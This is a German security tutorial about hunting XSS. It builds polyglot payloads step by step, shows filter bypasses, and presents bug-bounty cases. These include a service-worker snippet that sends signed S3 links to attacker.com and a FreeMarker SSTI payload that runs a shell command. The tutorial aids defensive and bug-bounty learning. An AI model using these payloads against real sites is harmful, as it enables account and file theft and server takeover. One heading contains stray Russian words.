---
title: "Effektive Suche nach XSS-Schwachstellen: Von alert() zu RCE | DevSense"
description: "Meistern Sie die Kunst, Cross-Site Scripting (XSS) zu finden und auszunutzen. Lernen Sie universelle Payloads zu bauen, Filter zu umgehen und XSS bis hin zu RCE zu eskalieren."
published: 2026-07-03
faq:
  - question: "Was macht einen Test-String zu einem universellen (Polyglot) XSS-Payload?"
    answer: "Ein universeller XSS-Payload ist so konzipiert, dass er in mehreren HTML-Kontexten (Attributen, Text, Skripten oder Stilen) erfolgreich ausgeführt wird, indem er vorhandene Tags/Anführungszeichen schließt und ein aktives Tag (wie ein iframe) einschleust, ohne den HTML-Parser des Browsers zu beschädigen."
  - question: "Wie kann ein Service Worker einen S3-Bucket für eine XSS-Attacke kapern?"
    answer: "Wenn eine Anwendung Benutzerdateien aus einem gemeinsamen S3-Bucket unter derselben Origin bereitstellt, kann ein Angreifer einen schädlichen Service Worker hochladen. Nach der Registrierung fängt dieser alle zukünftigen Dateianfragen in seinem Scope ab, wodurch temporäre Signaturen gestohlen und sensible Dateien exfiltriert werden können."
  - question: "Was ist der Unterschied zwischen clientseitiger Template-Injektion und SSTI?"
    answer: "Die clientseitige Template-Injektion (z. B. in AngularJS/VueJS) führt JavaScript im Browser des Opfers über eine clientseitig gerenderte Template-Expression aus. Server-Side Template Injection (SSTI) führt Code direkt auf dem Webserver innerhalb von Templates wie FreeMarker oder Twig aus, was häufig zur Remotecodeausführung (RCE) führt."
---

# Effektive Suche nach XSS-Schwachstellen: Von alert() zu RCE

Die Suche nach Sicherheitslücken wird oft als geheime Kunst angesehen, die nur Elite-Hackern vorbehalten ist. Clientseitige Bedrohungen wie **Cross-Site Scripting (XSS)** folgen jedoch einem strukturierten, logischen Muster. Durch das Verständnis der HTML-Analyse des Browsers und das Erlernen des Aufbaus universeller Payloads kann jeder Entwickler oder QS-Ingenieur XSS-Fehler effektiv identifizieren.

In diesem Leitfaden, der auf Heisenbug-Präsentationen und praktischer Bug-Bounty-Erfahrung basiert, werden wir eine solide Methodik zur Erkennung von XSS aufbauen, lernen, wie man erweiterte Payloads konstruiert, und reale Fälle untersuchen, in denen einfache Injektionen zu Server-Übernahmen eskalierten.

---

## Inhalt

* [Was ist XSS und warum tritt die Schwachstelle auf](#what-is-xss)
* [Die Methodik zur manuellen Suche](#hunting-methodology)
* [Konstruktion des universellen Payloads (Level 0 bis 1337)](#universal-payloads)
* [Umgehung von Filtern in der Praxis](#bypassing-restrictions)
* [Reale Bug-Bounty-Fallstudien](#case-studies)
    * [Umgehung von regulären Ausdrücken bei biz.mail.ru](#case-mailru)
    * [S3-Bucket-Angriff via Service Worker](#case-s3)
    * [E-Mail-HTML-Injektion und FreeMarker RCE](#case-ssti)
* [Gegenmaßnahmen & Absicherung](#mitigations)

---

<a id="what-is-xss"></a>
## Was ist XSS und warum tritt die Schwachstelle auf

**Cross-Site Scripting (XSS)** ist eine Schwachstelle, die es einem Angreifer ermöglicht, beliebigen JavaScript-Code im Browser eines Opfers im Sicherheitskontext (Origin) der Zielwebsite auszuführen.

Sie tritt auf, wenn eine Webanwendung nicht vertrauenswürdige Benutzereingaben entgegennimmt und in die generierte HTML-Seite einfügt, ohne sie ordnungsgemäß zu kodieren oder zu bereinigen. Browser können nicht zwischen dem Originalcode der Website und injizierten Skripten unterscheiden. Sie führen einfach alle HTML-Tags und JavaScript-Codes aus, die sie finden.

Wir unterscheiden XSS typischerweise in:
* **Stored (Gespeichertes) XSS:** Der schädliche Code wird in der Datenbank gespeichert (z. B. Benutzername, Kommentar) und später an andere Benutzer ausgeliefert.
* **Reflected (Reflektiertes) XSS:** Der schädliche Code wird sofort in der Serverantwort reflektiert, in der Regel über einen URL-Parameter oder den Text einer POST-Anfrage.

---

<a id="hunting-methodology"></a>
## Die Methodik zur manuellen Suche

Automatische Scanner übersehen häufig logische Schwachstellen und scheitern an Sicherheitsfiltern. Ein manueller Black-Box-Ansatz arbeitet weitaus zuverlässiger:

1. **Fügen Sie einen eindeutigen Test-String** (z. B. `qweqwe`) in jedes einzelne Eingabefeld, jeden URL-Parameter, jeden Header und jedes Upload-Formular ein.
2. **Untersuchen Sie das DOM der Seite.** Öffnen Sie die DevTools (`F12`), suchen Sie nach Ihrem String (`Ctrl+F`) und prüfen Sie, wie oft er auf der Seite ausgegeben wird.
3. **Analysieren Sie den Kontext des Strings.** Wo wurde er eingefügt? In normalen Text? In ein `value`-Attribut? In einen `<script>`-Block?
4. **Prüfen Sie Sonderzeichen** (`' " < > &`), um zu sehen, ob sie bereinigt (in HTML-Entities wie `&quot;`, `&lt;`, `&gt;` umgewandelt) oder im Rohformat ausgegeben werden.
5. **Konstruieren und eskalieren Sie den Payload** in Abhängigkeit von den erlaubten Zeichen.

---

<a id="universal-payloads"></a>
## Konstruktion des universellen Payloads (Level 0 bis 1337)

Anstatt den Code für jedes Feld manuell anzupassen, verwenden Bug-Hunters **universelle Payloads**, die gleichzeitig mehrere mögliche Einfügekontexte abdecken.

### Level 0: Der Anfänger
`"<script>alert()</script>"`
Dies funktioniert nur, wenn der Entwickler die Eingabe direkt im HTML-Text ausgibt:
```html
<p>Willkommen, Benutzer <script>alert()</script>!</p>
```

### Level 1: Ausbruch aus Attributen
Wenn die Eingabe in ein Attribut eines Tags fällt, scheitert die vorherige Variante — sie bleibt innerhalb der Anführungszeichen:
```html
<input name="search" value="<script>alert()</script>">
```
Wir müssen das Anführungszeichen und das Tag schließen: `">`
Neuer Payload: `"><script>alert()</script>`
```html
<input name="search" value=""><script>alert()</script>">
```

### Level 2: Ausbruch aus служебных тегов
Fällt der String in Tags wie `<title>`, `<style>`, `<textarea>` oder `<script>`, behandelt der Browser alle Daten als Text oder JS-Code und rendert keine HTML-Tags.
Wir müssen diese Tags zuerst schließen.
Neuer Payload: `"></title></script><script>alert()</script>`

Was ist, wenn der Entwickler das Attribut in einfache Anführungszeichen gesetzt hat? Fügen wir `'` am Anfang hinzu:
Neuer Payload: `'">></title></script><script>alert()</script>`

### Level 3: Nutzung von iframe
Das `<script>`-Tag wird oft von WAFs (Web Application Firewalls) blockiert. Stattdessen empfiehlt sich ein `<iframe>` mit dem Event `onload`:
Neuer Payload: `'">></title></script><iframe onload='alert()'>`

Der Frame führt den JavaScript-Code im Attribut `onload` sofort nach dem Rendern aus, auch ohne Angabe einer Quelle `src`.

### Level 1337: Slashes und Polyglotten
Fortgeschrittene Filter löschen Leerzeichen oder suchen nach schließenden Klammern. Wir können diese umgehen, wenn wir:
* Leerzeichen durch Slashes (`/`) ersetzen.
* Dem Browser erlauben, das Tag selbst zu schließen (wir entfernen `>`).
* Eventuelle HTML-Kommentare schließen (`-->`).
* Ausdrücke clientseitiger Template-Engines wie AngularJS oder VueJS einfügen (`{{7*7}}`).

Der endgültige universelle Payload:
```html
'"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--
```

Wenn dieser in ein Attribut eingefügt wird, entsteht:
```html
<input name="search" value=''"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--'>
```
Hier wird erfolgreich unser eigenes Attribut `test` erstellt, dessen Vorhandensein sich leicht mit einem Skript in der Konsole überprüfen lässt:
```javascript
if (document.querySelectorAll('*[test]').length > 0) {
    console.log("XSS über Attribut-Injektion erkannt!");
}
```

---

<a id="bypassing-restrictions"></a>
## Umgehung von Filtern in der Praxis

### 1. Nicht geschlossene Tags gegen reguläre Ausdrücke
Wenn ein Filter alle Konstruktionen der Form `<...>` löscht, können Sie ein nicht geschlossenes Tag senden:
```html
<iframe/onload='alert()'
```
Der Browser analysiert den String, stößt auf das Ende des Dokuments, fügt die schließende Klammer selbst hinzu und führt das Skript aus.

### 2. Leerzeichen in URL-Schemata
Bei der Überprüfung von Weiterleitungsparametern (z. B. `returnUrl`) prüfen Entwickler häufig, ob die Zeichenkette mit dem Wort `javascript:` beginnt.
* **Umgehung durch Leerzeichen:** Das Einfügen eines Leerzeichens oder Tabulators vor dem Schema (`%20javascript:alert()`) umgeht die einfache Überprüfung `startsWith`, während der Browser das Schema dennoch als gültig ansieht und den Code ausführt.
* **URL-Syntax:** Eine Konstruktion der Form `javascript://google.com/%0aalert()`. Der Doppelslash macht den nachfolgenden Text zu einem JS-Kommentar, und `%0a` (Zeilenumbruch) beendet ihn, um `alert()` auszuführen.

---

<a id="case-studies"></a>
## Reale Bug-Bounty-Fallstudien

<a id="case-mailru"></a>
### Fall 1: Umgehung von regulären Ausdrücken bei biz.mail.ru
Bei einem Projekt von Mail.ru führte ein Serverfehler 500 zu einer Weiterleitung auf eine Fehlerseite mit einem `from`-Parameter. Die Schaltfläche „Aktualisieren“ führte zu dieser Adresse.
* Der Versuch, `javascript:alert()` einzugeben, wurde durch `https://` ersetzt.
* Die Eingabe von `%20javascript:alert()` (mit einem Leerzeichen am Anfang) umging den regulären Ausdruck. Der schädliche Link wurde gespeichert und beim Klicken auf die Schaltfläche „Aktualisieren“ ausgeführt.

<a id="case-s3"></a>
### Fall 2: S3-Bucket-Angriff via Service Worker
In einem privaten CRM-System konnten Benutzer Dokumente hochladen, die in einem Amazon S3-Bucket gespeichert wurden.
Beim Öffnen einer Datei generierte der Server eine temporäre Signatur und leitete auf die S3-Domain weiter.
* Alle Benutzerdateien wurden im selben S3-Bucket gehostet.
* Der Angreifer lud eine HTML-Datei mit einem XSS-Payload hoch, die beim Öffnen JavaScript ausführte.
* Um Dateien anderer Benutzer zu stehlen, lud der Hacker einen schädlichen `serviceworker.js` hoch:
```javascript
// serviceworker.js
self.addEventListener('fetch', function(event) {
    event.respondWith(
        new Response("<iframe src='https://attacker.com/log?url=" + encodeURIComponent(event.request.url) + "'></iframe>", {
            headers: { 'Content-Type': 'text/html' }
        })
    );
});
```
* Dem Opfer wurde ein Link zur Datei `exploit.html` gesendet, die den Service Worker für den gesamten Stamm des S3-Buckets registrierte.
* Versuchte das Opfer nun, ein anderes vertrauliches Dokument im CRM zu öffnen, fing der Service Worker die Anfrage ab und sendete den temporär signierten Link an den Server des Angreifers.

<a id="case-ssti"></a>
### Fall 3: E-Mail-HTML-Injektion und FreeMarker RCE
Eine Marketingplattform ermöglichte das Anpassen von HTML-E-Mail-Vorlagen.
* Der Angreifer fügte die Ausdrücke `${7*7}` und `{{7*7}}` in die E-Mail-Vorlage ein.
* Bei der Vorschau berechnete der Server den Ausdruck und gab `49` aus, was auf eine **SSTI-Schwachstelle (Server-Side Template Injection)** hindeutete.
* Die Template-Engine war das Java-basierte **FreeMarker**. Unter Verwendung der integrierten Befehlsausführungsmethoden wurde die Injektion zur Codeausführung auf dem Server (**RCE**) eskaliert:
```html
[#assign cmd = 'freemarker.template.utility.Execute'?new()]
${cmd('id')}
```
Der Befehl `id` wurde auf dem Server ausgeführt, und das Ergebnis (root-Rechte) wurde direkt im E-Mail-Vorschaufenster angezeigt.

---

<a id="mitigations"></a>
## Gegenmaßnahmen & Absicherung

1. **Vertrauen Sie niemals Benutzereingaben:** Alle Parameter, Header und Dateinamen müssen validiert werden.
2. **Kontextbezogene Ausgabekodierung:** Verwenden Sie die richtige Bereinigung in Abhängigkeit von der Ausgabestelle:
    * Im HTML-Body: Verwenden Sie `htmlspecialchars()`.
    * Im JS-Kontext: Kodieren Sie mit `json_encode()`.
    * In Links: Erlauben Sie nur die Protokolle `http`/`https`.
3. **Nutzen Sie Content Security Policy (CSP):** Strikte CSP-Header verbieten die Ausführung von Inline-Skripten und beschränken die Quellen für das Laden von Ressourcen.
4. **Isolieren Sie Benutzerdateien:** Hosten Sie hochgeladene Inhalte auf einer völlig separaten Domain (z. B. `my-app-files.com`), auf der es keine Sitzungscookies und keinen Zugriff auf die Haupt-API gibt.
5. **Sichern Sie Template-Engines ab:** Deaktivieren Sie den Zugriff auf System-APIs und Sandboxes bei der Ausführung von Benutzervorlagen in FreeMarker, Twig oder Blade.
